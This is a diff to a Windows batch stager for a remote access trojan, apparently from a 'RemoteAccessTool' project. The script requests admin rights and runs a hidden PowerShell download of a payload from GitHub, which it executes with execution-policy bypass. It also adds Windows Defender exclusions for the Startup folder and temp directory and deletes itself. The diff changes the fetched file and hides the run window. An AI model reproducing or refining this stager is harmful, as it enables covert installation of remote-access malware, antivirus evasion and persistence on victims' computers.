@@ -1,16 +1,16 @@
-@echo off
 REM get admin permissions for script
+@echo off
 
 :: BatchGotAdmin
 :-------------------------------------
-REM  check for permissions
+REM  --> check for permissions
     IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
 >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
 ) ELSE (
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 )
 
-REM  if error flag set, we do not have admin.
+REM --> if error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
@@ -30,10 +30,10 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 REM rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/tarasermolenko/RemoteAccessTool/blob/main/files/rat_installer.ps1 -OutFile rat_installer.ps1"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/tarasermolenko/RemoteAccessTool/blob/main/files/wget.cmd -OutFile wget.ps1"
 Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 Add-MpPreference -ExclusionPath "$env:temp"
-powershell powershell.exe -ep bypass ./rat_installer.ps1
+powershell powershell.exe -windowstyle hidden -ep bypass ./wget.ps1
 
 @REM self delete
 del wget.cmd
